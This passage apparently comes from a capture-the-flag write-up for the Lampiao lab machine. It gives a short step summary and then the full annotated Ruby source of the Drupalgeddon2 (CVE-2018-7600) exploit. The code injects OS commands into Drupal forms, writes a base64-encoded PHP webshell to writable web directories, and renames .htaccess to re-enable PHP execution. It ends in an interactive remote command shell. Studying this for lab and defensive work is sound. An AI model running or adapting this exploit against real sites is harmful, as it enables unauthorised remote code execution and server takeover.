NOTE 7: PHP engine is disabled in `Drupal v7.x` so we have to enable it by moving the `./sites/default/files/.htaccess` to `.htaccess-bak` so the `.htaccess` would be disregarded enabling the PHP engine once again! This allows us to execute the `shell.php` uploaded on the web directory.


`4.` Checks for `user/register` : `user/password` form in the website. Dont need to do this in our case since our Drupal version is v7.x

`5.` Make an HTTP request to check whether `Drupal` is of version `v8.x` or `v7.x`.

`6.` Create an array of directory that we could possibly land the Webshell php file. In this case, it checks whether the following directories are writable:

		- "" (Web Root : /var/www/html/)
		- "sites/default/" (/var/www/html/sites/default)
		- "sites/default/files/" (/var/www/html/sites/default/files/)

`7.` Test whether you can write on atleast one text file on the Web root or another directory starting from the web root in the website and check using `GET` request to check if it landed.

`8.` Upload the `shell.php` webshell on the Web root directory.

`9.` You can write the payload on the webserver through HTTP POST request to trigger the `shell.php` webshell.

`10.` Check if the backdoor is successfully written in the web root.

##### Conclusion: This exploit was possible due to the fact that there are some directories in the webserver that are writable to ANY user!

##### Last Question: Why do arbitrary users are allowed to write on the webserver's www-data's directory in the first place?


# Note: Please open issue(s) on my Github page for inaccuracies so I can correct it! Thank you!


### Code Review of Druppalgeddon2.rb Exploit Source Code tailored to the vulnerability Lampiao box has:
```ruby
#!/usr/bin/env ruby
#
# [CVE-2018-7600] Drupal <= 8.5.0 / <= 8.4.5 / <= 8.3.8 / 7.23 <= 7.57 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/
#
# Authors:
# - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked
# - g0tmi1k   ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k
#
# Quick how to use
# def usage()
#   puts 'Usage: ruby drupalggedon2.rb <target> [--authentication] [--verbose]'
#   puts 'Example for target that does not require authentication:'
#   puts '       ruby drupalgeddon2.rb https://example.com'
#   puts 'Example for target that does require authentication:'
#   puts '       ruby drupalgeddon2.rb https://example.com --authentication'
# end

require 'base64'
require 'json'
require 'net/http'
require 'openssl'
require 'readline'
require 'highline/import'


# Settings - Try to write a PHP to the web root?
try_phpshell = true
# Settings - General/Stealth
$useragent = "drupalgeddon2"
webshell = "shell.php"
# Settings - Proxy information (nil to disable)
$proxy_addr = nil
$proxy_port = 8080


# Settings - Payload (we could just be happy without this PHP shell, by using just the OS shell - but this is 'better'!)
bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }" # this is the webshell's content.
bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d" # encode the webshell php code. Then concatenate how it gets decrypted.

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

# Function http_request <url> [type] [data]
def http_request(url, type="get", payload="", cookie="")
  puts verbose("HTTP - URL : #{url}") if $verbose
  puts verbose("HTTP - Type: #{type}") if $verbose
  puts verbose("HTTP - Data: #{payload}") if not payload.empty? and $verbose

  begin
    uri = URI(url)
    request = type =~ /get/? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)
    request.initialize_http_header({"User-Agent" => $useragent})
    request.initialize_http_header("Cookie" => cookie) if not cookie.empty?
    request.body = payload if not payload.empty?
    return $http.request(request)
  rescue SocketError
    puts error("Network connectivity issue")
  rescue Errno::ECONNREFUSED => e
    puts error("The target is down ~ #{e.message}")
    puts error("Maybe try disabling the proxy (#{$proxy_addr}:#{$proxy_port})...") if $proxy_addr
  rescue Timeout::Error => e
    puts error("The target timed out ~ #{e.message}")
  end

  # If we got here, something went wrong.
  exit
end


# Function gen_evil_url <cmd> [method] [shell] [phpfunction]
def gen_evil_url(evil, element="", shell=false, phpfunction="passthru")
  puts info("Payload: #{evil}") if not shell
  puts verbose("Element    : #{element}") if not shell and not element.empty? and $verbose
  puts verbose("PHP fn     : #{phpfunction}") if not shell and $verbose

  # Vulnerable parameters: #access_callback / #lazy_builder / #pre_render / #post_render
  # Check the version to match the payload
  if $drupalverion.start_with?("8") and element == "mail"
    # Method #1 - Drupal v8.x: mail, #post_render - HTTP 200
    url = $target + $clean_url + $form + "?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + evil

  elsif $drupalverion.start_with?("8") and element == "timezone"
    # Method #2 - Drupal v8.x: timezone, #lazy_builder - HTTP 500 if phpfunction=exec // HTTP 200 if phpfunction=passthru
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=" + phpfunction + "&timezone[a][#lazy_builder][][]=" + evil

    #puts warning("WARNING: May benefit to use a PHP web shell") if not try_phpshell and phpfunction != "passthru"

  elsif $drupalverion.start_with?("7") and element == "name"
    # Method #3 - Drupal v7.x: name, #post_render - HTTP 200
    url = $target + "#{$clean_url}#{$form}&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
    payload = "form_id=user_pass&_triggering_element_name=name"
  end

  # Drupal v7.x needs an extra value from a form
  if $drupalverion.start_with?("7")
    response = http_request(url, "post", payload, $session_cookie)

    form_name = "form_build_id"
    puts verbose("Form name  : #{form_name}") if $verbose

    form_value = response.body.match(/input type="hidden" name="#{form_name}" value="(.*)"/).to_s.slice(/value="(.*)"/, 1).to_s.strip
    puts warning("WARNING: Didn't detect #{form_name}") if form_value.empty?
    puts verbose("Form value : #{form_value}") if $verbose

    url = $target + "#{$clean_url}file/ajax/name/%23value/" + form_value
    payload = "#{form_name}=#{form_value}"
  end

  return url, payload
end


# Function clean_result <input>
def clean_result(input)
  #result = JSON.pretty_generate(JSON[response.body])
  #result = $drupalverion.start_with?("8")? JSON.parse(clean)[0]["data"] : clean
  clean = input.to_s.strip

  # PHP function: passthru
  # For: <payload>[{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
  clean.slice!(/\[{"command":".*}\]$/)

  # PHP function: exec
  # For: [{"command":"insert","method":"replaceWith","selector":null,"data":"<payload>\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
  #clean.slice!(/\[{"command":".*data":"/)
  #clean.slice!(/\\u003Cspan class=\\u0022.*}\]$/)

  # Newer PHP for an older Drupal
  # For: <b>Deprecated</b>:  assert(): Calling assert() with a string argument is deprecated in <b>/var/www/html/core/lib/Drupal/Core/Plugin/DefaultPluginManager.php</b> on line <b>151</b><br />
  #clean.slice!(/<b>.*<br \/>/)

  # Drupal v8.x Method #2 ~ timezone, #lazy_builder, passthru, HTTP 500
  # For: <b>Deprecated</b>:  assert(): Calling assert() with a string argument is deprecated in <b>/var/www/html/core/lib/Drupal/Core/Plugin/DefaultPluginManager.php</b> on line <b>151</b><br />
  clean.slice!(/The website encountered an unexpected error.*/)

  return clean
end


# Feedback when something goes right
def success(text)
  # Green
  return "\e[#{32}m[+]\e[0m #{text}"
end

# Feedback when something goes wrong
def error(text)
  # Red
  return "\e[#{31}m[-]\e[0m #{text}"
end

# Feedback when something may have issues
def warning(text)
  # Yellow
  return "\e[#{33}m[!]\e[0m #{text}"
end

# Feedback when something doing something
def action(text)
  # Blue
  return "\e[#{34}m[*]\e[0m #{text}"
end

# Feedback with helpful information
def info(text)
  # Light blue
  return "\e[#{94}m[i]\e[0m #{text}"
end

# Feedback for the overkill
def verbose(text)
  # Dark grey
  return "\e[#{90}m[v]\e[0m #{text}"
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

def init_authentication()
  $uname = ask('Enter your username:  ') { |q| q.echo = false }
  $passwd = ask('Enter your password:  ') { |q| q.echo = false }
  $uname_field = ask('Enter the name of the username form field:  ') { |q| q.echo = true }
  $passwd_field = ask('Enter the name of the password form field:  ') { |q| q.echo = true }
  $login_path = ask('Enter your login path (e.g., user/login):  ') { |q| q.echo = true }
  $creds_suffix = ask('Enter the suffix eventually required after the credentials in the login HTTP POST request (e.g., &form_id=...):  ') { |q| q.echo = true }
end

def is_arg(args, param)
  args.each do |arg|
    if arg == param
      return true
    end
  end
  return false
end


# Quick how to use
def usage()
  puts 'Usage: ruby drupalggedon2.rb <target> [--authentication] [--verbose]'
  puts 'Example for target that does not require authentication:'
  puts '       ruby drupalgeddon2.rb https://example.com'
  puts 'Example for target that does require authentication:'
  puts '       ruby drupalgeddon2.rb https://example.com --authentication'
end


# Read in values
if ARGV.empty?
  usage()
  exit
end

# 1st arg: http://<target-ip>:<listening-port>
$target = ARGV[0]
init_authentication() if is_arg(ARGV, '--authentication') # In our case, we didn't include "--authentication" flag.
$verbose = is_arg(ARGV, '--verbose')


# Check input for protocol
$target = "http://#{$target}" if not $target.start_with?("http")
# Check input for the end
$target += "/" if not $target.end_with?("/")


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Banner
puts action("--==[::#Drupalggedon2::]==--")
puts "-"*80
puts info("Target : #{$target}")
puts info("Proxy  : #{$proxy_addr}:#{$proxy_port}") if $proxy_addr
puts info("Write? : Skipping writing PHP web shell") if not try_phpshell
puts "-"*80


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Setup connection
uri = URI($target)
$http = Net::HTTP.new(uri.host, uri.port, $proxy_addr, $proxy_port)

# Use SSL/TLS if needed
if uri.scheme == "https"
  $http.use_ssl = true
  $http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end

$session_cookie = ''
# If authentication required then login and get session cookie
if $uname
  $payload = $uname_field + '=' + $uname + '&' + $passwd_field + '=' + $passwd + $creds_suffix
  response = http_request($target + $login_path, 'post', $payload, $session_cookie)
  if (response.code == '200' or response.code == '303') and not response.body.empty? and response['set-cookie']
    $session_cookie = response['set-cookie'].split('; ')[0]
    puts success("Logged in - Session Cookie : #{$session_cookie}")
  end

end

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Try and get version
$drupalverion = ""

# Possible URLs
url = [
  # --- changelog ---
  # Drupal v6.x / v7.x [200]
  $target + "CHANGELOG.txt",
  # Drupal v8.x [200]
  $target + "core/CHANGELOG.txt",

  # --- bootstrap ---
  # Drupal v7.x / v6.x [403]
  $target + "includes/bootstrap.inc",
  # Drupal v8.x [403]
  $target + "core/includes/bootstrap.inc",

  # --- database ---
  # Drupal v7.x / v6.x  [403]
  $target + "includes/database.inc",
  # Drupal v7.x [403]
  #$target + "includes/database/database.inc",
  # Drupal v8.x [403]
  #$target + "core/includes/database.inc",

  # --- landing page ---
  # Drupal v8.x / v7.x [200]
  $target,
]

# Check all
url.each do|uri|
  # Check response
  response = http_request(uri, 'get', '', $session_cookie)

  # Check header
  if response['X-Generator'] and $drupalverion.empty?
    header = response['X-Generator'].slice(/Drupal (.*) \(https:\/\/www.drupal.org\)/, 1).to_s.strip

    if not header.empty?
      $drupalverion = "#{header}.x" if $drupalverion.empty?
      puts success("Header : v#{header} [X-Generator]")
      puts verbose("X-Generator: #{response['X-Generator']}") if $verbose
    end
  end

  # Check request response, valid
  if response.code == "200"
    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
    puts success("Found  : #{uri}    (HTTP Response: #{response.code})#{tmp}")

    # Check to see if it says: The requested URL "http://<URL>" was not found on this server.
    puts warning("WARNING: Could be a false-positive [1-1], as the file could be reported to be missing") if response.body.downcase.include? "was not found on this server"

    # Check to see if it says: <h1 class="js-quickedit-page-title title page-title">Page not found</h1> <div class="content">The requested page could not be found.</div>
    puts warning("WARNING: Could be a false-positive [1-2], as the file could be reported to be missing") if response.body.downcase.include? "the requested page could not be found"

    # Only works for CHANGELOG.txt
    if uri.match(/CHANGELOG.txt/)
      # Check if valid. Source ~ https://api.drupal.org/api/drupal/core%21CHANGELOG.txt/8.5.x // https://api.drupal.org/api/drupal/CHANGELOG.txt/7.x
      puts warning("WARNING: Unable to detect keyword 'drupal.org'") if not response.body.downcase.include? "drupal.org"

      # Patched already? (For Drupal v8.4.x / v7.x)
      puts warning("WARNING: Might be patched! Found SA-CORE-2018-002: #{url}") if response.body.include? "SA-CORE-2018-002"

      # Try and get version from the file contents (For Drupal v8.4.x / v7.x)
      $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip

      # Blank if not valid
      $drupalverion = "" if not $drupalverion[-1] =~ /\d/
    end

    # Check meta tag
    if not response.body.empty?
      # For Drupal v8.x / v7.x
      meta = response.body.match(/<meta name="Generator" content="Drupal (.*) /)
      metatag = meta.to_s.slice(/meta name="Generator" content="Drupal (.*) \(http/, 1).to_s.strip

      if not metatag.empty?
        $drupalverion = "#{metatag}.x" if $drupalverion.empty?
        puts success("Metatag: v#{$drupalverion} [Generator]")
        puts verbose(meta.to_s) if $verbose
      end
    end

    # Done! ...if a full known version, else keep going... may get lucky later!
    break if not $drupalverion.end_with?("x") and not $drupalverion.empty?
  end

  # Check request response, not allowed
  if response.code == "403" and $drupalverion.empty?
    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
    puts success("Found  : #{uri}    (HTTP Response: #{response.code})#{tmp}")

    if $drupalverion.empty?
      # Try and get version from the URL (For Drupal v.7.x/v6.x)
      $drupalverion = uri.match(/includes\/database.inc/)? "7.x/6.x" : "" if $drupalverion.empty?
      # Try and get version from the URL (For Drupal v8.x)
      $drupalverion = uri.match(/core/)? "8.x" : "" if $drupalverion.empty?

      # If we got something, show it!
      puts success("URL    : v#{$drupalverion}?") if not $drupalverion.empty?
    end

  else
    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
    puts warning("MISSING: #{uri}    (HTTP Response: #{response.code})#{tmp}")
  end
end


# Feedback
if not $drupalverion.empty?
  status = $drupalverion.end_with?("x")? "?" : "!"
  puts success("Drupal#{status}: v#{$drupalverion}")
else
  puts error("Didn't detect Drupal version")
  exit
end

if not $drupalverion.start_with?("8") and not $drupalverion.start_with?("7")
  puts error("Unsupported Drupal version (#{$drupalverion})")
  exit
end
puts "-"*80




# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -



# The attack vector to use
$form = $drupalverion.start_with?("8")? "user/register" : "user/password" # NOTE 4: In the code, if it has Drupal v8.x, we either need to register first or have a rogue account.

# Make a request, check for form
url = "#{$target}?q=#{$form}"
puts action("Testing: Form   (#{$form})")
response = http_request(url, 'get', '', $session_cookie)
if response.code == "200" and not response.body.empty?
  puts success("Result : Form valid")
elsif response['location']
  puts error("Target is NOT exploitable [5] (HTTP Response: #{response.code})...   Could try following the redirect: #{response['location']}")
  exit
elsif response.code == "404"
  puts error("Target is NOT exploitable [4] (HTTP Response: #{response.code})...   Form disabled?")
  exit
elsif response.code == "403"
  puts error("Target is NOT exploitable [3] (HTTP Response: #{response.code})...   Form blocked?")
  exit
elsif response.body.empty?
  puts error("Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response")
  exit
else
  puts warning("WARNING: Target may NOT exploitable [1] (HTTP Response: #{response.code})")
end


puts "- "*40


# Make a request, check for clean URLs status ~ Enabled: /user/register   Disabled: /?q=user/register
# Drupal v7.x needs it anyway
$clean_url = $drupalverion.start_with?("8")? "" : "?q=" # Note 5: If the 
url = "#{$target}#{$form}"

puts action("Testing: Clean URLs")
response = http_request(url, 'get', '', $session_cookie)
if response.code == "200" and not response.body.empty?
  puts success("Result : Clean URLs enabled")
else
  $clean_url = "?q="
  puts warning("Result : Clean URLs disabled (HTTP Response: #{response.code})")
  puts verbose("response.body: #{response.body}") if $verbose

  # Drupal v8.x needs it to be enabled
  if $drupalverion.start_with?("8")
    puts error("Sorry dave... Required for Drupal v8.x... So... NOPE NOPE NOPE")
    exit
  elsif $drupalverion.start_with?("7")
    puts info("Isn't an issue for Drupal v7.x")
  end
end
puts "-"*80


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Values in gen_evil_url for Drupal v8.x
elementsv8 = [
  "mail",
  "timezone",
]
# Values in gen_evil_url for Drupal v7.x
elementsv7 = [
  "name",
]

elements = $drupalverion.start_with?("8") ? elementsv8 : elementsv7 # IN our case, it is Drupal v7.x

elements.each do|e|
  $element = e

  # Make a request, testing code execution
  puts action("Testing: Code Execution   (Method: #{$element})")

  # Generate a random string to see if we can echo it
  random = (0...8).map { (65 + rand(26)).chr }.join
  url, payload = gen_evil_url("echo #{random}", e)  # Writes a string on the generated evil URL in the website.

  response = http_request(url, "post", payload, $session_cookie)
  if (response.code == "200" or response.code == "500") and not response.body.empty?
    result = clean_result(response.body)
    if not result.empty?
      puts success("Result : #{result}")

	# This means that the tested random string was actually sent into the webserver and was successfully extracted it.
      if response.body.match(/#{random}/)
        puts success("Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!")
        break

      else
        puts warning("WARNING: Target MIGHT be exploitable [4]...   Detected output, but didn't MATCH expected result")
      end

    else
      puts warning("WARNING: Target MIGHT be exploitable [3] (HTTP Response: #{response.code})...   Didn't detect any INJECTED output (disabled PHP function?)")
    end

    puts warning("WARNING: Target MIGHT be exploitable [5]...   Blind attack?") if response.code == "500"

    puts verbose("response.body: #{response.body}") if $verbose
    puts verbose("clean_result: #{result}") if not result.empty? and $verbose

  elsif response.body.empty?
    puts error("Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response")
    exit

  else
    puts error("Target is NOT exploitable [1] (HTTP Response: #{response.code})")
    puts verbose("response.body: #{response.body}") if $verbose
    exit
  end

  puts "- "*40 if e != elements.last
end

puts "-"*80


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Location of web shell & used to signal if using PHP shell
webshellpath = ""
prompt = "drupalgeddon2"

# Possibles paths to try
paths = [
  # Web root
  "",
  # Required for setup
  "sites/default/",
  "sites/default/files/",
  # They did something "wrong", chmod -R 0777 .
  #"core/",
]

# Check all (if doing web shell)
paths.each do|path|
  # Check to see if there is already a file there
  puts action("Testing: Existing file   (#{$target}#{path}#{webshell})") # checks if shell.php is in the target path.

  response = http_request("#{$target}#{path}#{webshell}", 'get', '', $session_cookie)
  if response.code == "200"
    puts warning("Response: HTTP #{response.code} // Size: #{response.size}.   ***Something could already be there?***")
  else
    puts info("Response: HTTP #{response.code} // Size: #{response.size}")
  end

  puts "- "*40


  # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


  folder = path.empty? ? "./" : path  # if path is empty, set 'folder' to '/' otherwise, set it on one of the array of URL paths.
  puts action("Testing: Writing To Web Root   (#{folder})")  # 

  # Merge locations : Set the webshell path
  webshellpath = "#{path}#{webshell}"  # set the path then the webshell. Basically the landing of the webshell.

  # Final command to execute
  cmd = "#{bashcmd} | tee #{webshellpath}" # plugs in the actual webshell content to '/<target-path>/shell.php'

  # By default, Drupal v7.x disables the PHP engine using: ./sites/default/files/.htaccess
  # ...however, Drupal v8.x disables the PHP engine using: ./.htaccess
  if path == "sites/default/files/"
    puts action("Moving : ./sites/default/files/.htaccess")
    # PHP engine is disabled in Drupal v7.x so we have to enable it by moving the ./sites/default/files/.htaccess to .htaccess-bak so the .htaccess would be disregarded enabling the PHP engine once again!
    # and then EXECUTES the '<webshellpath>.php' that contains the actual webshell content. Then stores it to 'cmd' variable.
	cmd = "mv -f #{path}.htaccess #{path}.htaccess-bak; #{cmd}" 
  end

  # Generate evil URLs
  # In this case, 'cmd' is the one that gets sent to the webserver instead of the `shell.php` webshell. This is the base64 encoded webshell content.
  url, payload = gen_evil_url(cmd, $element)
  # Make the request
  response = http_request(url, "post", payload, $session_cookie) # 'payload' is the trigger to execute the 'shell.php' once it gets uploaded.
  # Check result
  if response.code == "200" and not response.body.empty?
    # Feedback
    result = clean_result(response.body)
    puts success("Result : #{result}") if not result.empty?

    # Test to see if backdoor is there (if we managed to write it)
    response = http_request("#{$target}#{webshellpath}", "post", "c=hostname", $session_cookie)
    if response.code == "200" and not response.body.empty?
      puts success("Very Good News Everyone! Wrote to the web root! Waayheeeey!!!")
      break

    elsif response.code == "404"
      puts warning("Target is NOT exploitable [2-4] (HTTP Response: #{response.code})...   Might not have write access?")

    elsif response.code == "403"
      puts warning("Target is NOT exploitable [2-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?")

    elsif response.body.empty?
      puts warning("Target is NOT exploitable [2-2] (HTTP Response: #{response.code})...   Got an empty response back")

    else
      puts warning("Target is NOT exploitable [2-1] (HTTP Response: #{response.code})")
      puts verbose("response.body: #{response.body}") if $verbose
    end

  elsif response.code == "500" and not response.body.empty?
    puts warning("Target MAY of been exploited... Bit of blind leading the blind")
    break

  elsif response.code == "404"
    puts warning("Target is NOT exploitable [1-4] (HTTP Response: #{response.code})...   Might not have write access?")

  elsif response.code == "403"
    puts warning("Target is NOT exploitable [1-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?")

  elsif response.body.empty?
    puts warning("Target is NOT exploitable [1-2] (HTTP Response: #{response.code}))...   Got an empty response back")

  else
    puts warning("Target is NOT exploitable [1-1] (HTTP Response: #{response.code})")
    puts verbose("response.body: #{response.body}") if $verbose
  end

  webshellpath = ""

  puts "- "*40 if path != paths.last
end if try_phpshell

# If a web path was set, we exploited using PHP!
if not webshellpath.empty?
  # Get hostname for the prompt
  prompt = response.body.to_s.strip if response.code == "200" and not response.body.empty?

  puts "-"*80
  puts info("Fake PHP shell:   curl '#{$target}#{webshellpath}' -d 'c=hostname'")
# Should we be trying to call commands via PHP?
elsif try_phpshell
  puts warning("FAILED : Couldn't find a writeable web path")
  puts "-"*80
  puts action("Dropping back to direct OS commands")
end


# Stop any CTRL + C action ;)
trap("INT", "SIG_IGN")


# Forever loop
loop do
  # Default value
  result = "~ERROR~"

  # Get input
  command = Readline.readline("#{prompt}>> ", true).to_s

  # Check input
  puts warning("WARNING: Detected an known bad character (>)") if command =~ />/

  # Exit
  break if command == "exit"

  # Blank link?
  next if command.empty?

  # If PHP web shell
  if not webshellpath.empty?
    # Send request
    result = http_request("#{$target}#{webshellpath}", "post", "c=#{command}", $session_cookie).body
  # Direct OS commands
  else
    url, payload = gen_evil_url(command, $element, true)
    response = http_request(url, "post", payload, $session_cookie)

    # Check result
    if not response.body.empty?
      result = clean_result(response.body)
    end
  end

  # Feedback
  puts result
end
```

